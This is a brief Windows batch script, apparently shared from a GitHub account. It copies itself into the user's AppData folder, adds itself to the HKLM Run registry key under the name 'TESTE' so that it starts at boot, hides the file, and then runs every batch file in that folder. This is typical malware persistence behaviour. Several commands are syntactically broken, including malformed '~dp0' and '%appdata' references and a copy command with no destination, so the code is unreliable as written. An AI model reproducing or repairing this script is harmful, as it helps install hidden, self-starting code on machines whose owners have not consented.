::::https://github.com/Gowq
@echo off
copy "%appdata%/~dp0"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TESTE" /t REG_SZ /d "%appdata%/~dp0" /f
attrib +h "~dp0"
start %appdata/*.bat
